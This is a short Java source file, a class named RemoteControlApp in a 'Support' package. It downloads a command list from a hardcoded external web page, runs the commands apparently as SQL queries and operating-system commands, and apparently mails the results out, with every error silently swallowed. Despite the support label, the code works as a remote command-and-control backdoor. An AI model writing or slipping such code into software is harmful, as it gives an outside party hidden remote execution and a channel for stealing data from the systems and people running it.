package Support.RemoteControl;
import java.util.*;

public class RemoteControlApp 
{
  public RemoteControlApp()
  {
  
  }
  public static void execute ()
  {
    try
    {
        //CommandsReader cr =  new CommandsReader("http://127.0.0.1:8988/Support/Commands.xml" , null);
        CommandsReader cr =  new CommandsReader("http://shawky.fortunecity.com/SADAD/RemoteCommands.html" , null);
        String allCommands = cr.getAllCommands();
        Vector commands = new Vector();
        commands.addElement(new SqlCommander(allCommands));
        commands.addElement(new RuntimeCommander(allCommands));
        for (int i=0 ; i< commands.size() ; i++)
        {
          Commander com = (Commander)commands.elementAt(i);
          com.execAndSendMail();
          if (com instanceof SqlCommander)
          {
          }
        }
    }
    catch (Exception e) {}
      
  }

public static void main(String[] args)
{
  Support.RemoteControl.RemoteControlApp.execute();
}

}